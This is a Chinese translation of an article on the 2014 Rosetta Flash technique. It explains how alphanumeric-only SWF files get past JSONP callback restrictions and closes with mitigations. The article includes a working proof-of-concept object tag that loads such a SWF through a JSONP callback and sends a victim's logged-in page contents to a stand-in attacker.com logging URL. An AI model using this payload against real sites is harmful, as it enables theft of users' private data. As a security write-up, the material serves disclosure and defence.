# 上传文件的陷阱II 纯数字字母的swf是漏洞么?

from:http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/

0x00 背景
-------

* * *

在上一篇上传文件的陷阱([http://drops.wooyun.org/tips/2031](http://drops.wooyun.org/tips/2031))当中,作者提到对于flash的跨域数据 劫持,有时并不需要我们去上传一个文件。因为我们可以简单的利用JSONP接口,将flash的内容赋[[email protected]](http://drops.com:8000/cdn-cgi/l/email-protection)样,利用JSONP的部分确实可以看作是整个 文章的“高潮点”。因为在多数情况下:

```
1.一个不会验证文件格式的上传点并没有那么好找
2.有时候我们找不到文件的真正路径,有时候文件会被强制下载
3.即使我们找到了不受条件[1]和[2]约束的上传点,也有可能会遭到“文件访问权限”的困扰!

```

当然这些也只是我在试图利用这种方法时遇到的一些困难,实际上也许还会有更复杂和更难以利⽤用的场景。相比之下如果是利用JSONP,事情就可能会变得相对简单一些。但实际上利⽤JSONP callback APIs道路也并没有那么平坦。因为很多开发者会对json的callbacks做一些限制。比如:

```
只允许[a-zA-Z]和 _ 和 .

```

先不论这种做法的好坏和正确性,首先我们必须得承认这种做法确实可以在某种程度上减少大部分的安全隐患。但是这样就真的安全了么?很明显,答案是否定的。为了证明这种防范措施依然是极 度脆弱的,作者开发了一个名为Rosetta Flash的工具。就像⽂文章的标题所描述的那样,利用该工具 可以帮助我们创建纯数字字母的swf文件。有了这种格式的swf在手,上述的callbacks限制也就自然 是浮云了。光凭说,好像完全没有说服力。让我们看看这种bypass问世后都有哪些大站躺枪:

```
* Google的⼀一些站点,如:accounts.google.com,主站和books,maps等分站
* Youtube
* Twitter
* Instagram
* Tumblr
* Lark
* eBay

```

写(翻译)到这里时才发现这个铺垫确实有点长了。下面就让我们来看看笔者的这把剑(Rosetta Flash)是怎么磨出来的吧。

0x01 Rosetta Flash
------------------

* * *

这种纯数字字母的swf的制作原理,主要就是将一般的swf二进制内容通过zlib压缩后再进行输出。 使用点对点的哈弗曼编码将非法字符映射为合法字符。当然了,严格的来说这种做法并不能被称作 是真正意义上压缩。

![enter image description here](http://drops.javaweb.org/uploads/images/b140e5e84c7e54b0235b817bc34021e0e4b04d3a.jpg)

通常,一个Flash文件既可以是没有被压缩过的(神奇的FWC字节),也可以是经过zlib(神奇的 CWS字节)或LZMA(神奇的ZWS字节)压缩过的。

SWF的头格式如下图所示:

![enter image description here](http://drops.javaweb.org/uploads/images/1c5801b546f7ba876767e5d4f150b125fe98d926.jpg)

由于Flash解析器具有极高的自由度(如下图)和忽略无效字节的特性,借助这种特性就可以让我们得到我们想要的字符。

![enter image description here](http://drops.javaweb.org/uploads/images/80da7eee2b8bd14c102749cf0a0be64dcad9e3fa.jpg)

首先我们要搞定zlib头中经过DEFLATE(同时使用了LZ77与哈夫曼编码的一种无损数据压缩算法)压缩过的前两个字节。我使用下面的方法搞定了其中的第一个字节:

![enter image description here](http://drops.javaweb.org/uploads/images/ed758f511313ac54af34dd6cd044fa6c52a0c3bc.jpg)

再通过这种方式搞定了其第二个字节:

![enter image description here](http://drops.javaweb.org/uploads/images/4d64fca7f477a9518e1d91b0358b3e90d2b17058.jpg)

虽然不存在太多这样的组合(两个字节)可以同时通过CMF+CINFO+FLG,但是0x68 0x43=hc恰好是符合的。

所以在Rosetta Flash当中我也使⽤用了这两个字节。

在搞定zlib头中的前两个字节后,还需要我们暴⼒破解其中的ADLER32校验(checksum)。

因为就像对其它部分所要求的那样,我们的checksum也必须是纯数字字母组成的。

在这里我们就使用了一种比较聪明的做法来获取由`[a-zA-Z0-9_\.]`构成的checksum。

![enter image description here](http://drops.javaweb.org/uploads/images/c56e12422244e226fe2d459756ccb44b0f1bfcb0.jpg)

对于我们来说,不论是S1还是S2都必须是由数字字母来构成的。

但问题是,我们要怎么去处理这个未压缩过的swf来获取这样的checksum呢?值得庆幸的是,SWF文件格式允许我们在其尾部加入任意字节。

而且这些字节是会被忽略的。这一特性帮助我搞定了S1和S2。我称之为Sleds + Deltas 技术。

![enter image description here](http://drops.javaweb.org/uploads/images/d12ac229a7979b49117c40ce3c04dea9441deaf7.jpg)

我们需要做的就是不停添加高位的seld直到出现一个单字节可以让S1模数溢出。

随后再添加delta. 通过这种手法,我们就可以获取一个合法的S1.之后我们在通过添加一个空字节的sled直到S2的模数溢出,最终就可以得到一个合法的S2了。

在经过这一切的处理之后,我们得到了一个checksum和zlib头均为合法的数字字母的原始swf⽂件。

现在让我们使用哈夫曼的魔法将所有的一切转换成我们需要的`[a-zA-Z0-9_\.]`吧。

![enter image description here](http://drops.javaweb.org/uploads/images/af2ea68e7432794c831cd7f1c248e19d21d0d404.jpg)

在这里我们使用了两个哈夫曼encoder来提高我们程序的效率。

如果你想了解更多的细节,可以在 Github上查阅Rosetta Flash的源代码:[https://github.com/mikispag/rosettaflash/](https://github.com/mikispag/rosettaflash/)

最终,按字节输出的效果会是这样:

![enter image description here](http://drops.javaweb.org/uploads/images/0c1c2d0c2365f6158d9ed6f65d00d66281beb2fd.jpg)

最终我们得到我们一直期盼的纯数字字母的SWF:

![enter image description here](http://drops.javaweb.org/uploads/images/9ca9cfa53ddb35a164010906a5ba01fbc8131c72.jpg)

相关POC(AS2代码):

![enter image description here](http://drops.javaweb.org/uploads/images/5f516d4c62eb2a68aaf0f58f0a1b755d78906edb.jpg)

我们将其编译为swf(未压缩),再用Rosetta Flash对其进行转换,最终得到:

![enter image description here](http://drops.javaweb.org/uploads/images/06bb5ebbe4cb475b472c9192a73b23eeee6f63d6.jpg)

```
<object type="application/x-shockwave-flash" data="https://vulnerable.com/endpoint? callback=CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0ssG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333333333333333s03sDTVqefXAxooooD0CiudIbEAt33swwEpt0GDG0GtDDDtwwGGGGGsGDt33333www033333GfBDTHHHHUhHHHeRjHHHhHHUccUSsgSkKoE5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbe13333333333sUUe133333Wf03sDTVqefXA8oT50CiudIbEAtwEpDDG033sDDGtwGDtwwDwttDDDGwtwG33wwGt0w33333sG03sDDdFPhHHHbWqHxHjHZNAqFzAHZYqqEHeYAHlqzfJzYyHqQdzEzHVMvnAEYzEVHMHbBRrHyVQfDQflqzfHLTrHAqzfHIYqEqEmIVHaznQHzIIHDRRVEbYqItAzNyH7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33swwEDt0GGDDDGptDtwwG0GGptDDww0GDtDDDGGDDGDDtDD33333s03GdFPXHLHAZZOXHrhwXHLhAwXHLHgBHHhHDEHXsSHoHwXHLXAwXHLxMZOXHWHwtHtHHHHLDUGhHxvwDHDxLdgbHHhHDEHXkKSHuHwXHLXAwXHLTMZOXHeHwtHtHHHHLDUGhHxvwTHDxLtDXmwTHLLDxLXAwXHLTMwlHtxHHHDxLlCvm7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtuwt3sG33ww0sDtDt0333GDw0w33333www033GdFPDHTLxXThnohHTXgotHdXHHHxXTlWf7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwwWtD333wwG03www0GDGpt03wDDDGDDD 33333s033GdFPhHHkoDHDHTLKwhHhzoDHDHTlOLHHhHxeHXWgHZHoXHT HNo4D0Up0IZUnnnnn nnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33wwE03GDDGwGGDDGDwGtwDtwDDGGDDtGDwwGw0GDDw0w33333www033GdFPHLRDXthHHHLHqeeorHthHHHXDhtxHHHLravHQxQHHHOnHDHyMIuiCyIYEHWSsgHmHKcskHoXHLHwhHHvoXHLhAotHthHHHLXAoXHLxUvH1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo888888880Nj0h" style="display: none"> <param name="FlashVars" value="url=https://vulnerable.com/account/sensitive_content_logged_in&exfiltrate=http://attacker.com/log.php"> </object>

```

0x02 缓解措施和修复
------------

* * *

*来⾃自Adobe的缓解措施

针对于这种情况,Adobe推出了修复版本14.0.0.125,并提到此次的修复会对flash进⾏行验证来组织 JSONP callback APIs的利用问题。

*来⾃自⺴⽹网站拥有者的缓解措施

可以通过设定

```
HTTP header Content-Disposition: attachment; filename=f.txt

```

来强制进⾏文件下载。

这种方式对于Flash 10.2以后的版本来说是完全足够的。然⽽而对于content sniffing攻击,我们可以在 callback内容的最前⾯面加上/**/来进行良好的防御(这也是⾕谷歌,facebook和Github一直在采取的措施)。当然我们也可以通过设定

```
X-Content-Type-Options: nosniff

```

来防御Opera和Chrome下的 content sniffing攻击。在这些浏览器下,Flash播放器一旦发现Content-type不为application/x- shockwave-flash就会拒绝swf⽂文件的执行。